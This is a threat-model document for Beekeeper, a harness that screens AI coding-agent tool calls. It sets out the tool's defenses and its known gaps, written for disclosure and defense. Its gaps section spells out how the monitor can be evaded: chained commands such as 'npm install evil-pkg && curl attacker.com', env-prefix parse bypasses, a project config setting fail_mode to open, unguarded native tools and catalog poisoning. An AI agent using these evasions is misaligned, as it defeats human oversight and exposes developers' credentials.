# Beekeeper Threat Model

**Covers:** v1.0.0 + v1.2.0 (Runtime Hardening) + v1.3.0 (Multi-Harness Hook Enforcement)  
**Originally published:** 2026-05-29 (v1.0.0, Phase 9 capstone)  
**Last full codebase audit:** 2026-06-05  
**Status:** Published — refreshed for v1.2.0 and v1.3.0

This document describes the security properties Beekeeper provides, the
attack surfaces it exposes, the known gaps in its defenses, and the
verification path an operator uses to confirm binary integrity. It is written
for a technical audience: security researchers, operators, and developers who
want to understand what they are trusting when they add Beekeeper to their
CI pipeline or developer workstation.

> **Version note.** The v1.0.0 sections below remain accurate and are preserved
> verbatim. Two new top-level sections cover the work shipped after v1.0.0:
> **§10 Multi-Harness Hook Enforcement (v1.3.0)** — the exit-2 deny protocol,
> the per-harness deny contract families, the Hermes fail-OPEN class, and the
> 15 per-harness config-file installers — and **§11 Runtime Hardening (v1.2.0):
> SPATH, CORR, NUDGE**. The Attack Surface Summary (§1) and the Known Gaps
> section (§8) have been refreshed to reference these. Where a v1.0.0 claim was
> found to be stronger on paper than in code during the 2026-06-05 audit, the
> discrepancy is called out honestly in §8 rather than silently edited.

---

## Table of Contents

1. [Beekeeper's Own Threat Model](#1-beekeepers-own-threat-model)
2. [Build and Release Pipeline Hardening](#2-build-and-release-pipeline-hardening)
3. [Catalog Feed Integrity: The 2FA Principle](#3-catalog-feed-integrity-the-2fa-principle)
4. [Coordinated False-Positive Poisoning Attack Surface](#4-coordinated-false-positive-poisoning-attack-surface)
5. [The fanotify mmap Gap on Linux](#5-the-fanotify-mmap-gap-on-linux)
6. [The beekeeper-self Catalog](#6-the-beekeeper-self-catalog)
7. [Verification Path](#7-verification-path)
8. [Known Gaps and Explicit Non-Defenses](#8-known-gaps-and-explicit-non-defenses)
9. [Declarative Policy Overlay: Escape Hatch and Known Limitations](#9-declarative-policy-overlay-escape-hatch-and-known-limitations)
10. [Multi-Harness Hook Enforcement (v1.3.0)](#10-multi-harness-hook-enforcement-v130)
11. [Runtime Hardening (v1.2.0): SPATH, CORR, NUDGE](#11-runtime-hardening-v120-spath-corr-nudge)

---

## 1. Beekeeper's Own Threat Model

### What Beekeeper Is Defending Against

Beekeeper is a real-time safety harness that intercepts autonomous coding
agent tool calls before they execute. It defends against:

- **Malicious package installation** — an agent that installs a compromised
  npm, PyPI, or extension package as part of legitimate-looking work.
- **Sensitive path access** — an agent that reads `~/.ssh/`, `~/.aws/`, or
  other credential paths outside the project working directory.
- **Lifecycle script abuse** — a package whose `postinstall` script executes
  arbitrary code.
- **Supply-chain corroboration evasion** — a single attacker-controlled catalog
  that flags a legitimate package as malicious (or misses a truly malicious
  one).
- **Prompt injection** — adversarial content in the developer's codebase that
  hijacks the agent's next action.

### What Compromising Beekeeper Gives an Attacker

Beekeeper runs with the developer's full filesystem and network privileges. A
compromised Beekeeper binary is equivalent to compromising the developer's
account. The attacker gains:

- Read access to all files the developer can read (credentials, SSH keys,
  tokens, source code).
- Write access to all files the developer can write (source code,
  configuration, CI scripts).
- Network access to all endpoints the developer's machine can reach
  (internal services, cloud APIs, package registries).
- The ability to silently suppress block decisions, allowing the agent to
  install malicious packages or exfiltrate data undetected.

This threat is not hypothetical — it is the reason Beekeeper implements the
`beekeeper-self` self-quarantine catalog (see Section 6) and the reproducible
build + Sigstore pipeline (see Section 2).

### Attack Surface Summary (ordered by risk)

| Surface | Risk | Mitigation |
|---------|------|------------|
| Beekeeper binary supply chain | Critical | Reproducible builds, Sigstore, SLSA Level 3, `beekeeper-self` feed |
| Catalog feeds (bumblebee, OSV, Socket) | High | Corroboration semantics (see Section 3 + §11 CORR), sanity bounds, signatures |
| Harness deny delivery (does the block actually stop the tool?) | High | exit-2 universal deny + per-harness deny JSON (see §10); fail-closed on unknown harness. **Tier-3 harnesses (Kilo/Trae) leave native tools unguarded; Hermes is structurally fail-OPEN** — see §10 |
| Agent tool-call intake (`beekeeper check` stdin) | High | 1MB oversize probe, bounded JSON decode, 8s exec deadline, 256MB cap, top-level panic-recover — every path fails **closed** |
| MCP gateway listener (`127.0.0.1:7837`) | High | constant-time bearer auth, 1MB body cap, bounded JSON-RPC parser (fuzzed), echo-back `id` correlation, token stripped before upstream. **`--bind 0.0.0.0` exposes it over plaintext HTTP — see §8** |
| Sensitive-path runtime reads (`~/.ssh`, `.env`, MCP dirs) | High | SPATH blocklist applied **after** the allowlist overlay (most-restrictive-wins) so an allowlist cannot downgrade a credential-read block — see §11 |
| Per-harness config-file installers (15 targets) | Medium | merge-not-clobber, per-target 0600 backup, atomic temp+rename, foreign-script preservation, user privileges only — see §10 |
| Project/env config layer (`fail_mode`, `self_catalog.*`) | Medium | merged above user config and reaches every decision — a project-local `fail_mode:open` relaxes fail-closed; see §8 |
| Policy file injection | Medium | `policyloader.ValidateSchema` rejects unknown fields and `exec` actions |
| Policy allowlist override (escape hatch) | Medium | `package_allowlist` allow rules can override catalog blocks — see Section 9 |
| Audit log tampering / leakage | Low | Owner-only permissions (0600), append-only writes, redaction at check/gateway chokepoints, OTLP/syslog fan-out (see §8 for redaction field-coverage limits) |
| IPC named pipe / Unix socket | Low | SO_PEERCRED / LOCAL_PEERCRED UID check + 0600 (Unix); SDDL DACL scoped to installing-user SID (Windows); 64KB framed cap |

---

## 2. Build and Release Pipeline Hardening

### Reproducible Builds

Every Beekeeper binary is built with deterministic flags:

```
-trimpath -buildvcs=false -mod=readonly
```

`-trimpath` removes all local filesystem paths from the binary so two builds
of the same source produce byte-identical output regardless of the builder's
machine. `-buildvcs=false` prevents the VCS state from affecting the build.
`-mod=readonly` ensures no dependency changes happen at build time.

Verify locally:

```bash
make verify-release VERSION=X.Y.Z
```

### Keyless Signing (Sigstore/cosign v3)

Every released binary is keylessly signed via Sigstore/cosign v3 using GitHub
Actions OIDC. No long-lived private signing key exists to be stolen. The
signing identity is tied to the GitHub Actions workflow:

```
https://github.com/bantuson/beekeeper/.github/workflows/release.yml
```

Verify with cosign:

```bash
cosign verify \
  --certificate-identity=https://github.com/bantuson/beekeeper/.github/workflows/release.yml@refs/tags/v<version> \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  beekeeper
```

### SLSA Level 3 Provenance

Release provenance is generated via `slsa-github-generator@v2.1.0` (full
semver tag required — pinning to `@v2` is insufficient for SLSA Level 3).
SLSA Level 3 guarantees:

- Build was triggered by a source commit the attacker cannot forge without
  write access to the repository.
- The build environment was ephemeral and not modified by the build script.
- The provenance is signed by the SLSA generator, not by the project itself.

Verify SLSA provenance:

```bash
slsa-verifier verify-artifact beekeeper \
  --provenance-path beekeeper.intoto.jsonl \
  --source-uri github.com/bantuson/beekeeper
```

### Pinned Dependencies

All Go dependencies are pinned via `go.mod` + `go.sum` with `go mod verify`
enforced in CI. Dependency updates are proposed by Renovate and require human
review before merge. Indirect dependencies are covered by `go.sum` checksums.

### CycloneDX SBOM

A CycloneDX Software Bill of Materials is published with every release. It
lists all direct and transitive Go dependencies with their checksums. Use the
SBOM to verify no unexpected dependencies were introduced:

```bash
# Compare SBOM dependency list against expected
cat beekeeper.cyclonedx.json | jq '.components[].name'
```

---

## 3. Catalog Feed Integrity: The 2FA Principle

Beekeeper's threat-intel feed design treats corroboration as a second factor
for block decisions. This is the core defense against a single attacker-
controlled catalog source.

### Corroboration Semantics

By default (configurable via `corroboration_threshold` policy rules):

| Source count flagging a package | Action |
|----------------------------------|--------|
| 1 source | Warn — investigate but do not block |
| 2 sources | Block — enforce |
| 3+ sources | Block + quarantine |

An adversary who controls a single catalog source (bumblebee, OSV, or Socket)
can generate warning events for legitimate packages, but cannot escalate to a
block or quarantine decision without controlling a second independent source.
This is analogous to two-factor authentication: one compromised factor is
not sufficient.

### Signature Verification

The `beekeeper-self` self-quarantine feed is cryptographically verified against
an embedded Ed25519 public key before its entries are applied (§6); an
invalid/absent signature is an integrity failure that fails closed. For the
**primary bumblebee** catalog, integrity in the live decision path rests on
corroboration (the two-source requirement) plus the sanity bounds below — a
bumblebee entry's `signed` flag is currently a *presence* check, not Ed25519
verification (TM-B-02; see the §11 honesty note). When bumblebee's sync trips a
sanity bound the source is marked degraded and per-severity escalation overrides
are **suppressed** (the engine falls back to flat corroboration thresholds, so a
single degraded-feed match cannot escalate a `critical` to a block on its own).
The OSV and Socket sources are per-request network adapters that degrade to
*no-match* on error, so a degraded adapter contributes nothing toward escalation.
(An earlier draft of this section described a fractional "0.5 weight" for degraded
sources; that fractional weighting is **not implemented** — escalation suppression
on canonical-feed degradation is the actual mechanism.)

### Sanity Bounds

Catalog syncs apply configurable sanity bounds on entry-count deltas. A sync
that reports a sudden drop of >50% or an implausibly large spike in entries
triggers a sanity alert or hard-block before the new index is applied. This
prevents a feed compromise that simply wipes all entries (allowing all
packages) or floods the index with false positives.

### Degraded Mode

When a catalog source cannot be fetched or fails signature verification,
Beekeeper continues operating using the last-known good cached state. The
`beekeeper diag` command shows per-source degraded status so operators can
investigate without service interruption.

---

## 4. Coordinated False-Positive Poisoning Attack Surface

**This is a known, documented gap in Beekeeper's defenses.**

### The Attack

An adversary who controls two or more catalog sources (the corroboration
threshold for a block decision) can manufacture false-positive block events
for any legitimate package. For example:

1. Attacker compromises or creates two catalog sources (e.g., bumblebee +
   Socket.dev API account).
2. Attacker adds legitimate popular packages (e.g., `react`, `lodash`) to
   both sources' threat-intel feeds as "malicious."
3. Beekeeper blocks every agent action that installs these packages.
4. The developer, frustrated by constant false blocks, disables Beekeeper
   enforcement (`fail_mode: open`) or removes the hooks.
5. With enforcement disabled, the attacker can now install genuinely malicious
   packages undetected.

This is a **denial of service / coercion attack** — the attacker does not need
to install malicious code directly; they degrade the developer's trust in
Beekeeper's signal quality until enforcement is disabled.

### Why There Is No Complete Fix at This Layer

Full defense against this attack requires human-in-the-loop review of catalog
changes. Automated systems with a fixed corroboration threshold cannot
distinguish "two independent sources both discovered this package is malicious"
from "two colluding or compromised sources manufactured this block event."

**Known mitigations (partial):**

- Sanity bounds limit how rapidly any single feed can change, reducing the
  blast radius of a sudden poisoning event.
- The audit log records every block decision with its source provenance, so
  operators can investigate patterns.
- Degraded mode and corroboration counts are surfaced to operators in `beekeeper diag`.
- Future work: human-in-the-loop review workflow, source reputation weighting,
  and independent source audits (post-v1.0.0).

**For v1.0.0:** This gap is accepted and documented. Users who operate in
adversarial environments where catalog source compromise is a realistic threat
should configure a low `corroboration_threshold` (warn-only) and manually
review catalog state changes.

---

## 5. The fanotify mmap Gap on Linux

**This is a known, documented gap in Beekeeper's Linux Sentry defenses.**

### How fanotify Works

The Linux Sentry uses `fanotify` to intercept `FAN_OPEN_PERM` events — kernel
notifications for file-open operations on watched paths. When a process opens
a file, Beekeeper's Sentry can evaluate the access before the kernel grants
the open permission.

### The Gap

`fanotify` only intercepts **new file-open operations** after the watch is
established. Files that were already mapped into a process's address space via
`mmap(2)` **before** fanotify was activated are NOT re-intercepted.

Specifically:

- A library that was `mmap`-loaded at process startup (before Beekeeper Sentry
  was installed or before the fanotify watch was placed on the library path)
  will continue executing without triggering any Sentry alert.
- An attacker with code-execution access who pre-loads a malicious shared
  library via `LD_PRELOAD` before Beekeeper's Sentry starts can evade all
  file-access-based detection.

### Scope

This gap is limited to the Sentry's file-access detection path. It does NOT
affect:

- The hook handler (`beekeeper check`) which intercepts agent tool calls at
  the protocol layer, not the kernel file-access layer.
- The catalog corroboration check, which evaluates packages by name/version.
- The MCP gateway, which intercepts JSON-RPC at the network layer.
- Quarantine decisions based on catalog matches.

### Mitigation

No complete in-process mitigation exists for this gap in v1.0.0 scope. The
Sentry is designed as a behavioral correlation layer, not a kernel rootkit
prevention system.

**Partial mitigations:**

- Install Beekeeper Sentry before the agent process starts, not after.
- Use immutable read-only bind-mounts for sensitive library paths on production
  systems (defense-in-depth at the OS layer).
- The Sentry's network-level correlation (ETW on Windows, process-tree
  tracking) provides independent detection that does not rely on fanotify.

This gap is accepted for v1.0.0 scope and will be revisited when
`FAN_MARK_FILESYSTEM` and `FAN_MARK_INODE` semantics for mmap'd regions
improve in future kernel versions.

---

## 6. The beekeeper-self Catalog

The `beekeeper-self` catalog is Beekeeper's self-defense against its own
supply-chain compromise. It is the answer to the question: "What if Beekeeper
itself is the malicious package?"

### How It Works

1. **Startup check**: Before any enforcement command runs (`beekeeper check`,
   `beekeeper gateway`, `beekeeper sentry`, `beekeeper watch`), Beekeeper
   fetches the `beekeeper-self` feed and checks whether the running binary's
   version string appears in the compromised-version list.

2. **Sync check**: After every `beekeeper catalogs sync`, the same check runs
   so that a newly-published compromise entry is acted on immediately.

3. **On a version match**: Beekeeper self-quarantines — it writes an audit
   record, prints a prominent warning to stderr with the full verification
   path, and refuses to run enforcement commands. Diagnostic commands
   (`beekeeper version`, `beekeeper diag`, `beekeeper selftest`,
   `beekeeper policy validate`) remain runnable so the developer can
   investigate.

4. **Separate key, separate host**: The `beekeeper-self` feed is hosted
   separately from the main repository and verified against a distinct Ed25519
   public key embedded in the binary at compile time. Compromising the release
   pipeline key does NOT allow forging a `beekeeper-self` feed signature. Both
   systems must be compromised independently.

5. **Fail-closed vs. transient network failure**: Beekeeper distinguishes
   between "signature invalid" (integrity failure → fail closed) and "network
   unreachable" (transient → warn and continue). An absent or stale cache is
   uncertainty, not a proven compromise. Only a bad signature triggers fail-
   closed behavior.

### Feed Schema

The `beekeeper-self` feed is a static signed JSON file:

```json
{
  "schema_version": "1",
  "entries": [
    {
      "id": "beekeeper-self-2026-001",
      "name": "Beekeeper v0.4.2 release pipeline compromise",
      "ecosystem": "beekeeper",
      "package": "beekeeper",
      "versions": ["v0.4.2"],
      "severity": "critical",
      "catalog_source": "beekeeper-self"
    }
  ],
  "catalog_signature": "<base64-ed25519-signature-over-entries-json>"
}
```

The signature is an Ed25519 signature over `json.Marshal(entries)` — the
canonical JSON encoding of the entries array — not over the full feed JSON
(which would be circular). The public key is embedded in the binary.

### Governance Honesty Note (v1.0.0)

**For v1.0.0, the `beekeeper-self` feed is maintained by a single maintainer
(Mzansi Agentive Pty Ltd — Mfanafuthi Mhlanga).** This means that an attacker
who compromises the maintainer's GitHub account and the feed hosting has full
control over the self-quarantine signal.

This is a single point of trust. It is documented here explicitly because
pretending it does not exist would be dishonest.

**Intent for post-v1.0.0:** Separate the `beekeeper-self` feed maintainer set
from the main repository maintainers, require multi-party approval for feed
entries (M-of-N signing), and publish a key ceremony transcript. This reduces
the single-maintainer risk to a multi-party compromise requirement.

For v1.0.0, users who cannot accept this single-maintainer governance model
can point to a self-hosted `beekeeper-self` feed by setting:

```json
{
  "self_catalog": {
    "url": "https://your-mirror.example.com/beekeeper-self.json",
    "pub_key": "<your-base64-ed25519-public-key>"
  }
}
```

in `~/.beekeeper/config.json` (or the project `.beekeeper/config.json`).

---

## 7. Verification Path

Use this path to verify a Beekeeper binary before installing it, or to
investigate a self-quarantine event.

### Step 1: Verify the build hash

```bash
make verify-release VERSION=X.Y.Z
```

This command downloads the released binary for `VERSION`, rebuilds it from the
corresponding source tag, and compares the output hash. A mismatch indicates
the released binary was not produced from the tagged source.

### Step 2: Verify the Sigstore/cosign signature

```bash
cosign verify \
  --certificate-identity=https://github.com/bantuson/beekeeper/.github/workflows/release.yml@refs/tags/v<version> \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  beekeeper
```

A successful `cosign verify` confirms the binary was produced by the GitHub
Actions release workflow and was signed by a GitHub OIDC token, not a manually
held key.

### Step 3: Verify SLSA provenance

```bash
slsa-verifier verify-artifact beekeeper \
  --provenance-path beekeeper.intoto.jsonl \
  --source-uri github.com/bantuson/beekeeper
```

SLSA Level 3 provenance confirms the build environment was ephemeral,
the build was triggered by a signed commit, and the provenance itself was
produced by the SLSA generator (not the project's own workflow).

### Step 4: Inspect the SBOM

```bash
# List all direct and transitive dependencies
cat beekeeper.cyclonedx.json | jq '.components[] | "\(.name)@\(.version)"'
```

Compare against the expected dependency list for the release tag. Unexpected
entries indicate a dependency was added between the tagged source and the
released binary.

### Step 5: Report and recover

If verification fails at any step:

1. **Do not run the binary on any system with sensitive credentials.**
2. File a private security advisory via the process in [SECURITY.md](../SECURITY.md).
3. While waiting for a response, roll back to the last known-good version by
   re-running steps 1–4 on the previous release.

### During a self-quarantine event

If `beekeeper` refuses to run with a self-quarantine message, run the
verification steps above on the installed binary. If the binary passes all
verification steps but the self-quarantine fires, the `beekeeper-self` feed
entry may be incorrect — file a private advisory to report the false positive.

Diagnostic commands remain usable during self-quarantine:

```bash
beekeeper version          # confirm installed version
beekeeper diag             # inspect catalog and latency state
beekeeper selftest         # run adversarial corpus against the engine
beekeeper policy validate  # check policy file schemas
```

For the full disclosure and bug-report process, see [SECURITY.md](../SECURITY.md).
For build verification details, see [BUILDING.md](../BUILDING.md) (if present).

---

## 8. Known Gaps and Explicit Non-Defenses

### What Beekeeper Does NOT Defend Against

The following threats are explicitly out of scope for v1.0.0. Documenting them
here prevents false confidence.

#### Kernel Rootkits and Pre-Boot Attacks

An adversary with kernel-level access (ring-0) can intercept or modify any
process's memory, file I/O, or network operations before Beekeeper sees them.
Kernel rootkits can also patch `fanotify` event delivery, suppress audit log
writes, or modify the Beekeeper binary in memory. Beekeeper provides no
defense against an already-compromised kernel.

**Mitigation at a higher layer:** Secure Boot, measured boot (TPM), and OS
integrity verification tools (e.g., `aide`, `dm-verity`) provide defense at
the kernel layer. These are OS-level concerns outside Beekeeper's scope.

#### Pre-Existing Malware on the Developer Machine

If malicious code is already present on the developer's machine when Beekeeper
is installed, that malware can observe Beekeeper's binary, modify it, or
intercept its decisions. Beekeeper is designed to detect and block malicious
agent behavior; it is not designed to remediate an already-compromised host.

#### Direct Human Malice

If the developer themselves (or someone with their credentials) wants to
install a malicious package, Beekeeper's enforcement can be trivially bypassed
by disabling hooks, setting `fail_mode: open`, or running package managers
directly. Beekeeper is an agent safety harness, not a policy enforcement
system for humans.

#### Sophisticated Prompt Injection Beyond LlamaFirewall's Detection Capability

LlamaFirewall's CodeShield and AlignmentCheck models detect common prompt
injection patterns. Novel, highly-tailored prompt injection attacks that
specifically craft payloads to evade the current model versions may succeed
undetected. Model detection quality improves with each LlamaFirewall release
but is inherently bounded by training data and adversarial capability.

#### Zero-Day Agent Tool-Call Semantics

Beekeeper intercepts tool calls by tool name and argument structure. A new
agent tool or tool-call format that Beekeeper has not been updated to parse
correctly may pass through undetected. The hook handler fails closed (blocks)
on malformed or oversized input, but a new tool with a novel JSON structure
may produce an "allow" decision by default until Beekeeper's schema is updated.

#### Catalog Source Unavailability (Sustained)

If all catalog sources are simultaneously unreachable for more than 24 hours,
Beekeeper will continue in degraded mode (read from stale cache with
prominent warnings). A sustained multi-source outage does not cause Beekeeper
to block all agent actions, but it reduces the quality of threat intelligence.
This is an explicit availability vs. security tradeoff: bricking all agents
for a multi-day outage was not acceptable for v1.0.0.

#### Tier-3 Harnesses: Native Tools Are Unguarded (v1.3.0)

Beekeeper intercepts agent tool calls through one of two mechanisms: a
**pre-exec hook** (Tier 1/2 harnesses) or the **MCP gateway** (Tier 3). Two
supported harnesses — **Kilo** and **Trae** — have no upstream pre-exec hook
mechanism at all. For these, Beekeeper can only intercept tool calls that are
routed through the MCP gateway.

**The consequence:** any *native* built-in tool a Kilo or Trae agent invokes —
Bash, file read/write, shell execution — bypasses Beekeeper entirely. Coverage
is opt-in via gateway routing and is **partial by construction**. This is an
upstream limitation (e.g. Kilo FR #5827), not a Beekeeper implementation bug,
but it is a real residual coverage gap that depends on user configuration.

To a lesser degree, **Windsurf** (fail-OPEN on any non-2 exit code) and
**OpenCode** (its JS plugin does not intercept subagent `task` calls — issue
#5894 — or, historically, MCP calls — issue #2319) also have coverage holes.
Users who require complete pre-exec coverage should use a Tier-1 harness. See
`docs/harness-support-matrix.md` and §10 for the full per-harness breakdown.

#### Hermes Is a Structurally Fail-OPEN Harness (v1.3.0)

**Hermes ignores hook exit codes.** A block is carried *only* by emitting
`{"action":"block","message":"..."}` on stdout; any hook timeout, crash, or
non-JSON stdout causes Hermes to **allow** the tool call. Beekeeper renders the
exact JSON Hermes expects and suppresses its own raw decision line so it cannot
leak ahead of the deny form (see §10), but there is no exit-code backstop: the
block rests entirely on Hermes parsing stdout as documented. Any future Hermes
stdout-format drift re-opens a silent-allow window. The MCP gateway is the more
robust enforcement path for Hermes use cases.

#### Gateway Remote-Bind Exposure and the Missing `allow_remote_gateway` Gate

The gateway binds to `127.0.0.1` by default. The CLI help text states that
binding to a public interface (`--bind 0.0.0.0`) "requires
`allow_remote_gateway:true` in config." **In the current code this second-factor
config gate does not exist** — there is no such config field and no validation;
`--bind` flows straight to `net.Listen`. A single `--bind` flag therefore
exposes the policy-decision proxy (and the upstream MCP server behind it) to
off-host clients, protected only by the per-session bearer token.

This is operator-initiated, not remotely triggerable (`--bind` is a CLI flag
only — it cannot be set from a config file, so a poisoned project config cannot
expose the gateway). However, two honesty caveats apply: (1) the help text
promises a gate that is not implemented, which can create false confidence; and
(2) the gateway is plain HTTP with no TLS, so a non-loopback bind sends the
bearer token over the network in cleartext. **Recommendation:** do not bind the
gateway to a non-loopback interface. This item is tracked for either
implementing the gate or correcting the help text.

#### Project/Env Config Layer Can Relax Fail-Closed Enforcement

Beekeeper merges a project-local `.beekeeper/config.json` (discovered by walking
up from the working directory) **above** the user config. In Beekeeper's own
threat model the working tree is an untrusted surface — it is exactly the
agent-cloned repository the tool exists to police. A project-local
`{"fail_mode":"open"}` (or a dependency `postinstall` that writes one) therefore
converts every fail-closed safety net — crash, timeout, oversized stdin,
missing/corrupt index — into fail-open, and the same layer can disable `nudge`
and the LlamaFirewall sidecar or repoint the `self_catalog` URL+key.

The v1.0.0 model framed this under "Direct Human Malice" (the operator can
always disable enforcement). That remains true for a deliberate operator, but
the project layer is the *lowest-trust* file layer and is honored with the same
precedence as a benign override, with no ownership or integrity check. A more
defensive design would refuse fail-mode *relaxation* (closed→open) and
`self_catalog.*` overrides from the project/env layers, accepting them only from
user/system config. Until then: **treat the project `.beekeeper/config.json` as
security-relevant, and do not run agents in untrusted repositories with project
config discovery enabled if you rely on a fail-closed posture.**

#### Audit Redaction Is Field-Scoped

Redaction (`RedactRecord`) is applied at the `beekeeper check` and gateway
chokepoints before records fan out to remote sinks, and it covers the primary
credential carriers (the decision `Reason` and the raw/rewritten package-manager
commands). It is **field-scoped**, not content-scanning: Sentry-derived fields
(accessed file paths, network destinations, process exe paths, correlated
extension IDs) and catalog coordinates are written verbatim, and the
behavioral-watch audit path does not currently route through `RedactRecord` at
all. A credential embedded in a watched file path or network destination can
therefore reach a remote OTLP/HTTPS/syslog sink unscrubbed. The local audit file
is owner-only (0600); remote sinks emit a "data leaving this machine" warning.
Operators forwarding audit logs off-host should account for this field-coverage
limit.

#### Detection-Completeness Gaps in the Behavioral Sentry

The Sentry is a behavioral *correlation* layer (detect/audit), not an
enforcement chokepoint — the hook and gateway are where blocks happen. Two
cross-signal correlation rules (fresh-extension correlation and the critical
read-creds + fresh-extension + phone-home exfiltration-fusion rule) require an
extension-inventory snapshot that the shipped daemons do not yet build, so those
two rules do not fire in production today; the underlying behaviors (credential
read, outbound connection, editor-descendant process tree) are still detected
independently. On Windows, file/network events carry no parent-PID, so a
short-lived or race-ordered malicious child can lose editor-descendant
attribution. And collectors drop events under flood (the Linux fanotify path
does not even count drops), so an attacker who floods benign events can evade
windowed file-access rules. These reduce *detection coverage*; they do not relax
the fail-closed enforcement path.

#### Windows Sentry: Missing Parent-PID on File and Network Events (TM-RS-02)

**Accepted detection-completeness gap — backlog.**

The Windows ETW parser (`internal/sentry/windows/parser.go`) does not populate
the PPID field on file-access (`EventFileAccess`) or network-connect
(`EventNetworkConnect`) events — only process-create events carry PPID in the
ETW schema consumed here. The `isEditorDescendant` check (`rules.go:84-102`)
walks the PPID chain to attribute behaviors to an editor-descended process. A
malicious child process that:

- performs a credential file read or initiates an outbound connection, AND
- is short-lived or appears before its parent's process-create event is processed
  (race-ordered event delivery), AND
- has only file/net events (no process-create event) in the correlation window

…can silently lose editor-descendant attribution, causing SENTRY-001, SENTRY-002,
and SENTRY-003 to not fire for that child on Windows.

**Impact:** Detection-completeness gap on Windows only; the enforcement (hook/gateway
block) path is unaffected. Linux and macOS carry PPID on all event types.

**Mitigation status:** No PPID-resolution fallback exists for file/net events on
Windows. A future fix would use the ETW `TcpIp`/`FileIo` extended data or a
secondary WMI/NtQuerySystemInformation snapshot to resolve PPID at event time.
This is tracked as a backlog item; it does not affect the fail-closed invariant.

#### Package-Parse Evasion Classes Accepted as Zero-Day Semantics (TM-B-06)

**Accepted limitation — specific evasion classes documented here.**

The package-manager command parser (`internal/pkgparse/pkgparse.go`) uses a
`HasPrefix`-based approach on the command string. The following input patterns
produce `ok=false` from `pkgparse.Parse`, which causes `engine.go` to return
an `allow` decision with reason "no package identified":

1. **Command chaining:** `npm install evil-pkg && curl attacker.com` — the
   `&&`, `;`, and `|` tokens are not pre-stripped. The install command
   substring matches, but the parsed package may be empty or wrong because
   the entire shell expression (including the chained command) is passed as
   the package token.

2. **Leading environment-variable assignments:** `FOO=bar npm install evil-pkg`
   — the `FOO=bar` prefix prevents the `HasPrefix("npm install")` from
   matching; the parser returns `ok=false`; the tool call is allowed.

3. **Unlisted package managers:** `deno install evil-pkg`, `mvn install:install-file`,
   `nuget install EvilPackage` — these are not in the install-prefix table
   and parse as "no package identified" → `allow`.

The result for all three classes is a fail-**OPEN** parse: the tool call is
allowed, not blocked. This is the zero-day tool-call semantics gap described
earlier in this section — any novel agent tool or tool-call format that
Beekeeper has not been updated to handle produces an allow-by-default decision
rather than a block.

**Mitigation approach:** The corroboration layer (2+ sources → block) still
applies to correctly-parsed commands; these evasions bypass parsing entirely.
Operators who require coverage of chained commands or unlisted package managers
should use the Sentry behavioral layer (SENTRY-003 phone-home detection, SENTRY-001
credential-file access) as a second signal, and review audit logs for `allow`
decisions from `bash`/`sh` tool calls whose `command` field contains install-like
substrings.

#### Catalog Sanity Bounds Do Not Defend Against Content-Preserving Feed Tampering (TM-B-07)

**Accepted limitation — scope of sanity bounds documented here.**

The catalog sanity gate (`internal/catalog/sanity.go:CheckSanity`) validates
that a refreshed catalog snapshot does not deviate from baseline **count metrics**:
total entry count, per-ecosystem delta, and overall growth rate. These bounds
defend against bulk anomalies such as a feed wholesale-deleting entries (emptying
the catalog) or tripling its entry count in a single sync.

**What sanity bounds do NOT defend against:** a count-preserving 1:1 swap of
individual entries. An attacker who replaces exactly one real entry with one
crafted entry changes no counts and passes the sanity gate entirely. The sanity
gate is not designed to detect content-level tampering of individual entries.

**What does defend against individual-entry tampering:**

- **Corroboration:** a single tampered entry from one source produces at most a
  one-source warn (or a one-source block only for critical-severity entries with
  `SeverityOverrides[critical].BlockAt=1`). Two independent sources must agree
  before a non-critical block fires.
- **Catalog signatures:** Bumblebee entries carry a `CatalogSignature` field;
  `beekeeper-self` entries are verified with a separately-embedded Ed25519 key.
  Note that the primary Bumblebee path performs a string-presence check rather
  than cryptographic verification (TM-B-02, tracked separately).
- **SLSA Level 3 + cosign provenance** on the Beekeeper binary itself ensures
  that the code processing catalog entries has not been tampered with.

**Summary:** sanity bounds = anti-bulk-anomaly first line of defense; corroboration
+ signatures = anti-individual-entry-tampering second line of defense. These are
complementary layers, not alternatives.

---

---

## 9. Declarative Policy Overlay: Escape Hatch and Known Limitations

### Package Allowlist Override Escape Hatch (T-09-31)

Beekeeper supports version-controlled policy files (`~/.beekeeper/policies/*.json`)
with `package_allowlist` rules. A `package_allowlist` rule whose `action` is `"allow"`
can **override a catalog-corroborated block or warn decision** for the exact listed
package.

**This is intentional behavior.** The purpose is to let operators make explicit,
version-controlled trust decisions — for example, to allowlist an internal package
that a fresh catalog source incorrectly flags, or to express that a particular
"flagged" package is a known false-positive in the operator's environment.

**Why this is a documented escape hatch:**

- A `package_allowlist` allow rule for a package silences all enforcement against
  that package, including catalog-corroborated blocks (2+ signed sources agreeing).
- A malicious or misconfigured policy file placed in `~/.beekeeper/policies/` can
  selectively disable enforcement for targeted packages.
- The override is recorded in the decision `Reason` field in every audit record, so
  it is forensically visible: any allow decision that cites a policy allowlist rule
  is immediately distinguishable from a genuine catalog-clear decision.

**Mitigations:**

- Policy files are validated by `policyloader.ValidateSchema` which rejects unknown
  fields, `exec` action values, and unknown rule types (T-09-30).
- The `~/.beekeeper/policies/` directory is governed by the same owner-only (0600)
  permission convention as the config file. An attacker who can write to this
  directory already has the developer's full filesystem access.
- Every allowlist-override allow decision includes `"policy overlay: rule ... allowlists
  this package (user-trust override — recorded for audit)"` in the `Reason` field.
  Operators monitoring audit logs can detect unexpected allowlist overrides.

**Recommendation:** Treat `~/.beekeeper/policies/` as part of your security-relevant
configuration. Place policy files in version-controlled directories and review
`allow`-action rules carefully before deploying.

### Dashboard Policy Editor (`beekeeper dashboard --admin`)

The TUI policy panel edits a **real, enforced** policy file
(`~/.beekeeper/policies/beekeeper-tui.json`) — a valid typed `PolicyFile` that
`LoadPolicyDir` loads like any other. It supersedes the retired prototype
`tui_rules.json`, whose foreign schema the engine silently skipped (so its toggles
were cosmetic).

- **Last gate:** all edits are written exclusively through `policyloader.SavePolicyFile`,
  which runs `ValidateForPersist` (`ValidateSchema` + corroboration threshold-ordering
  bounds) and writes **nothing** when validation fails. An invalid edit is rejected in
  the TUI and never reaches disk, so the editor cannot put a file in `policies/` that
  the engine would reject or clamp.
- **Trust boundary:** the editor writes the same enforced `policies/` surface as a
  hand-edited file, and `package_allowlist`/`sensitive_path` entries added in the TUI
  carry the same escape-hatch semantics documented above (T-09-31). Admin-gated
  (`--admin`); the directory keeps owner-only (0600) permissions.
- **No-clobber:** the editor writes only `beekeeper-tui.json`; other policy files in the
  directory are never modified.

